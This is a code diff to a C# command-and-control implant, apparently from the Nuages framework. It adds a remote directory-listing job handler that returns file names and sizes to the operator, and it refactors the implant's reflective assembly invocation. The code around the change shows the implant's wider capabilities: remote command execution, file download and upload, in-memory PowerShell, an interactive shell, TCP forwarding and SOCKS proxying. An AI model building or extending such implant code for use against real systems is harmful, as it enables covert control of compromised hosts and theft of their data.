@@ -65,6 +65,7 @@ namespace NuagesSharpImplant
             do_job = new Dictionary<string, Action<JsonObject>>()
               {
                   {"command", (JsonObject) => do_command(JsonObject) },
+                  {"ls", (JsonObject) => do_ls(JsonObject) },
                   {"cd", (JsonObject) => do_cd(JsonObject) },
                   {"configure", (JsonObject) => do_configure(JsonObject) },
                   {"exit", (JsonObject) => do_exit(JsonObject) },
@@ -111,7 +112,7 @@ namespace NuagesSharpImplant
 
             this.connectionString = connector.getConnectionString();
 
-            this.supportedPayloads = new string[] { "command", "cd", "configure", "exit", "kill_job", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };
+            this.supportedPayloads = new string[] { "command", "ls", "cd", "configure", "exit", "kill_job", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };
 
             this.rnd = new Random();
 
@@ -207,6 +208,51 @@ namespace NuagesSharpImplant
 
             SubmitJobResult(jobId, newDir, false);
 
+        }
+
+        void do_ls(JsonObject job)
+        {
+            string jobId = job["_id"];
+            string path = ".";
+            try
+            {
+                path = job["payload"]["options"]["path"];
+            }
+            catch { }
+
+            Directory.SetCurrentDirectory(path);
+            string cwd = Directory.GetCurrentDirectory();
+
+            JsonArray entries = new JsonArray();
+            foreach (string entryPath in Directory.GetFileSystemEntries("."))
+            {
+                JsonObject entry = new JsonObject();
+                entry.Add("name", Path.GetFileName(entryPath));
+
+                if (Directory.Exists(entryPath))
+                {
+                    entry.Add("size", JsonValue.Parse("null"));
+                    entry.Add("type", "directory");
+                }
+                else if (File.Exists(entryPath))
+                {
+                    entry.Add("size", new FileInfo(entryPath).Length);
+                    entry.Add("type", "file");
+                }
+                else
+                {
+                    entry.Add("size", JsonValue.Parse("null"));
+                    entry.Add("type", "other");
+                }
+
+                entries.Add(entry);
+            }
+
+            JsonObject result = new JsonObject();
+            result.Add("cwd", cwd);
+            result.Add("files", entries);
+
+            SubmitJobResult(jobId, result.ToString(), false);
         }
 
         void do_configure(JsonObject job)
@@ -467,7 +513,9 @@ namespace NuagesSharpImplant
             StreamWriter writer = new StreamWriter(ostrm);
             Console.SetOut(writer);
             Console.SetError(writer);
-            object objResult = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr);
+            var myclass = assembly.GetType(clas);
+            var mymethod = myclass.GetMethod(method, typearr);
+            object objResult = mymethod.Invoke(0, argarr);
             Console.SetOut(oldOut);
             Console.SetError(oldOutErr);
             writer.Close();
